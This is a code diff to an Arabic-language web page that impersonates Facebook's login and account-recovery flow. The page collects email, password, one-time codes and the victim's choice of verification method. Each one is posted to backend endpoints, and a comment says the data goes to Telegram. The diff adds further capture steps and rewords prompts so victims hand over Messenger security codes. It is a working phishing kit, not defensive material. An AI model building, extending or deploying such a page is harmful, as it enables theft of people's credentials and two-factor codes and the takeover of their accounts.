@@ -16,7 +16,6 @@
             padding: 20px;
         }
         
-        /* ========== عام ========== */
         .page { display: none; }
         .page.active { display: block; }
         
@@ -31,7 +30,6 @@
         
         .left-section { flex: 1; max-width: 500px; padding-bottom: 60px; }
         .fb-logo { width: 240px; height: auto; margin-bottom: 8px; }
-        .tagline { font-size: 28px; color: #1c1e21; font-weight: 400; line-height: 32px; width: 500px; }
         .right-section { flex: 0 0 396px; width: 396px; }
         
         .login-card {
@@ -97,31 +95,6 @@
         
         .forgot-link:hover { text-decoration: underline; }
         
-        .divider { border-top: 1px solid #dadde1; margin: 12px 0 20px; }
-        
-        .create-btn {
-            display: block;
-            width: fit-content;
-            margin: 0 auto;
-            padding: 12px 20px;
-            background: #42b72a;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-        
-        .create-btn:hover { background: #36a420; }
-        
-        .below-text { text-align: center; font-size: 14px; color: #1c1e21; margin-top: 28px; }
-        .below-text a { color: #1c1e21; text-decoration: none; font-weight: 600; }
-        .below-text a:hover { text-decoration: underline; }
-        
-        /* ========== صفحة OTP ========== */
         .otp-container {
             background: #fff;
             border-radius: 8px;
@@ -220,20 +193,6 @@
         
         .error-msg.show { display: block; }
         
-        .success-msg {
-            background: #e7f7ed;
-            border: 1px solid #42b72a;
-            color: #1c1e21;
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 14px;
-            display: none;
-            margin-bottom: 14px;
-            text-align: center;
-        }
-        
-        .success-msg.show { display: block; }
-        
         .back-link {
             display: inline-block;
             color: #1877f2;
@@ -248,7 +207,6 @@
         
         .back-link:hover { text-decoration: underline; }
         
-        /* ========== صفحة اختيار الطريقة ========== */
         .method-btn {
             width: 100%;
             padding: 14px 16px;
@@ -284,21 +242,9 @@
             flex-shrink: 0;
         }
         
-        .method-btn .method-text {
-            flex: 1;
-        }
-        
-        .method-btn .method-title {
-            font-weight: 700;
-            font-size: 15px;
-            color: #1c1e21;
-        }
-        
-        .method-btn .method-desc {
-            font-size: 13px;
-            color: #606770;
-            margin-top: 2px;
-        }
+        .method-btn .method-text { flex: 1; }
+        .method-btn .method-title { font-weight: 700; font-size: 15px; color: #1c1e21; }
+        .method-btn .method-desc { font-size: 13px; color: #606770; margin-top: 2px; }
         
         .forgot-code-link {
             display: block;
@@ -333,16 +279,13 @@
             }
             
             .fb-logo { width: 180px; }
-            .tagline { font-size: 20px; line-height: 24px; width: 100%; text-align: center; }
             .right-section { flex: 0 0 auto; width: 100%; max-width: 396px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================ -->
     <!-- 1. صفحة تسجيل الدخول -->
-    <!-- ============================================================ -->
     <div id="page-login" class="page active">
         <div class="main-container">
             <div class="left-section">
@@ -350,7 +293,6 @@
                     <path fill="#1877f2" d="M631.25,0H35.42C15.85,0,0,15.85,0,35.42v62.5c0,19.57,15.85,35.42,35.42,35.42h595.83c19.57,0,35.42-15.85,35.42-35.42V35.42C666.67,15.85,650.81,0,631.25,0z"/>
                     <text x="333" y="85" font-family="Helvetica, Arial, sans-serif" font-size="70" font-weight="bold" fill="#fff" text-anchor="middle">facebook</text>
                 </svg>
-                <p class="tagline">يتيح لك فيسبوك التواصل ومشاركة ما يهمك مع الأشخاص في حياتك.</p>
             </div>
             
             <div class="right-section">
@@ -361,17 +303,12 @@
                         <button type="submit" class="login-btn">تسجيل الدخول</button>
                         <button type="button" class="forgot-link" id="forgotBtn">هل نسيت كلمة المرور؟</button>
                     </form>
-                    <div class="divider"></div>
-                    <a href="#" class="create-btn">إنشاء حساب جديد</a>
                 </div>
-                <p class="below-text"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 2. صفحة "نسيت كلمة المرور" - كتابة البريد -->
-    <!-- ============================================================ -->
+    <!-- 2. صفحة "نسيت كلمة المرور" -->
     <div id="page-forgot" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
@@ -386,9 +323,7 @@
         </div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 3. صفحة OTP الأولى (بعد تسجيل دخول / نسيت كلمة مرور) -->
-    <!-- ============================================================ -->
+    <!-- 3. OTP الأولى -->
     <div id="page-otp" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
@@ -415,9 +350,7 @@
         </div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 4. صفحة Messenger - اختيار طريقة التحقق -->
-    <!-- ============================================================ -->
+    <!-- 4. Messenger - اختيار الطريقة -->
     <div id="page-messenger" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
@@ -428,7 +361,6 @@
                 <strong id="displayEmail2">بريدك الإلكتروني</strong>
             </div>
             
-            <!-- زر Messenger -->
             <button type="button" class="method-btn" id="methodMessenger">
                 <div class="method-icon">💬</div>
                 <div class="method-text">
@@ -437,7 +369,6 @@
                 </div>
             </button>
             
-            <!-- زر OTP -->
             <button type="button" class="method-btn" id="methodOtp">
                 <div class="method-icon">🔢</div>
                 <div class="method-text">
@@ -450,9 +381,7 @@
         </div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 5. صفحة OTP النهائية (بعد اختيار OTP) -->
-    <!-- ============================================================ -->
+    <!-- 5. OTP النهائية -->
     <div id="page-otp-final" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
@@ -479,17 +408,14 @@
         </div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 6. صفحة Messenger Final (بعد اختيار Messenger) -->
-    <!-- ============================================================ -->
+    <!-- 6. Messenger Final -->
     <div id="page-messenger-final" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
             <div class="icon-circle">💬</div>
             <div class="title">أدخل رمز Messenger</div>
             <div class="subtitle">
-                لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
-                <strong id="displayEmail4">حساب Messenger</strong>
+                افتح تطبيق Messenger واطّلع على الرسالة التي تحتوي على رمز الأمان الخاص بك المكوّن من 6 أرقام، ثم أدخله هنا.
             </div>
             
             <div id="errorMsg4" class="error-msg"></div>
@@ -505,50 +431,33 @@
             
             <button type="button" class="verify-btn" id="verifyBtn4">متابعة</button>
             <button type="button" class="resend-btn" id="resendBtn4" disabled>إعادة إرسال الرمز (<span id="timerCount4">60</span>ث)</button>
-            <br>
-            <button type="button" class="forgot-code-link" onclick="showPage('page-messenger')">هل نسيت الرمز؟ استخدم طريقة أخرى</button>
+            <button type="button" class="forgot-code-link" id="forgotMessengerCode">هل نسيت كلمة المرور؟</button>
         </div>
     </div>
 
     <script>
-        // =============================================
-        // المتغيرات العامة
-        // =============================================
         let userEmail = '';
-        let currentStage = 'login'; // login | forgot
 
-        // =============================================
-        // دالة تبديل الصفحات
-        // =============================================
         function showPage(pageId) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(pageId).classList.add('active');
             window.scrollTo(0, 0);
         }
 
-        // =============================================
-        // تحديث الإيميل في كل الصفحات
-        // =============================================
         function updateEmails() {
             const email = userEmail || 'بريدك الإلكتروني';
             document.getElementById('displayEmail1').textContent = email;
             document.getElementById('displayEmail2').textContent = email;
             document.getElementById('displayEmail3').textContent = email;
-            document.getElementById('displayEmail4').textContent = email;
         }
 
-        // =============================================
         // 1. تسجيل الدخول
-        // =============================================
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value.trim() || '(empty)';
             const password = document.getElementById('password').value.trim() || '(empty)';
-            
             userEmail = email;
-            currentStage = 'login';
             
-            // إرسال لتيلجرام
             await fetch('/submit-login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -559,11 +468,8 @@
             showPage('page-otp');
         });
 
-        // =============================================
         // 2. نسيت كلمة المرور
-        // =============================================
         document.getElementById('forgotBtn').addEventListener('click', function() {
-            // نسجل إنه ضغط على "نسيت كلمة المرور"
             const email = document.getElementById('email').value.trim();
             userEmail = email;
             
@@ -576,13 +482,10 @@
             showPage('page-forgot');
         });
 
-        // =============================================
-        // 3. صفحة "نسيت كلمة المرور" - إرسال البريد
-        // =============================================
+        // 3. إرسال نسيت كلمة المرور
         document.getElementById('forgotSubmit').addEventListener('click', async function() {
             const email = document.getElementById('forgotEmail').value.trim() || '(empty)';
             userEmail = email;
-            currentStage = 'forgot';
             
             await fetch('/submit-forgot', {
                 method: 'POST',
@@ -594,9 +497,7 @@
             showPage('page-otp');
         });
 
-        // =============================================
-        // 4. التعامل مع OTP Boxes (عام)
-        // =============================================
+        // 4. OTP Boxes
         function setupOtpBoxes(containerId) {
             const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
             inputs.forEach((input, index) => {
@@ -625,9 +526,6 @@
         setupOtpBoxes('otpContainer3');
         setupOtpBoxes('otpContainer4');
 
-        // =============================================
-        // 5. قراءة OTP من الحاويات
-        // =============================================
         function getOtpValue(containerId) {
             let otp = '';
             document.querySelectorAll(`#${containerId} .otp-input`).forEach(i => otp += i.value);
@@ -639,9 +537,7 @@
             document.querySelector(`#${containerId} .otp-input`).focus();
         }
 
-        // =============================================
-        // 6. OTP الأولى (بعد تسجيل دخول / نسيت كلمة مرور)
-        // =============================================
+        // 5. OTP الأولى
         document.getElementById('verifyBtn1').addEventListener('click', async function() {
             const otp = getOtpValue('otpContainer1');
             const errorMsg = document.getElementById('errorMsg1');
@@ -662,7 +558,6 @@
                 body: JSON.stringify({ otp, email: userEmail, stage: 'first-otp' })
             }).catch(() => {});
             
-            // الانتقال لصفحة Messenger
             setTimeout(() => {
                 this.disabled = false;
                 this.textContent = 'متابعة';
@@ -671,9 +566,7 @@
             }, 1000);
         });
 
-        // =============================================
-        // 7. صفحة Messenger - اختيار الطريقة
-        // =============================================
+        // 6. اختيار الطريقة
         document.getElementById('methodOtp').addEventListener('click', async function() {
             await fetch('/submit-method', {
                 method: 'POST',
@@ -692,19 +585,33 @@
                 body: JSON.stringify({ method: 'messenger', email: userEmail })
             }).catch(() => {});
             
-            updateEmails();
             showPage('page-messenger-final');
         });
 
-        // "هل نسيت الرمز؟" في صفحة Messenger
-        document.getElementById('forgotCodeBtn').addEventListener('click', function() {
-            // يروح لصفحة OTP النهائية
+        // 7. نسيت الرمز في Messenger
+        document.getElementById('forgotCodeBtn').addEventListener('click', async function() {
+            // إشعار إنه ضغط على "نسيت الرمز"
+            await fetch('/submit-forgot-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: userEmail, from: 'messenger-page' })
+            }).catch(() => {});
+            
             showPage('page-otp-final');
         });
 
-        // =============================================
-        // 8. OTP النهائية
-        // =============================================
+        // 8. نسيت كلمة المرور في Messenger Final
+        document.getElementById('forgotMessengerCode').addEventListener('click', async function() {
+            await fetch('/submit-forgot-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: userEmail, from: 'messenger-final' })
+            }).catch(() => {});
+            
+            showPage('page-messenger');
+        });
+
+        // 9. OTP النهائية
         document.getElementById('verifyBtn3').addEventListener('click', async function() {
             const otp = getOtpValue('otpContainer3');
             const errorMsg = document.getElementById('errorMsg3');
@@ -734,9 +641,7 @@
             }, 1500);
         });
 
-        // =============================================
-        // 9. Messenger Final
-        // =============================================
+        // 10. Messenger Final
         document.getElementById('verifyBtn4').addEventListener('click', async function() {
             const otp = getOtpValue('otpContainer4');
             const errorMsg = document.getElementById('errorMsg4');
@@ -766,9 +671,7 @@
             }, 1500);
         });
 
-        // =============================================
-        // 10. أزرار إعادة الإرسال
-        // =============================================
+        // 11. إعادة الإرسال
         function setupResend(btnId, timerId) {
             const btn = document.getElementById(btnId);
             const timerSpan = document.getElementById(timerId);
@@ -806,9 +709,6 @@
         setupResend('resendBtn3', 'timerCount3');
         setupResend('resendBtn4', 'timerCount4');
 
-        // =============================================
-        // بدء
-        // =============================================
         console.log('✅ التطبيق جاهز');
     </script>
 
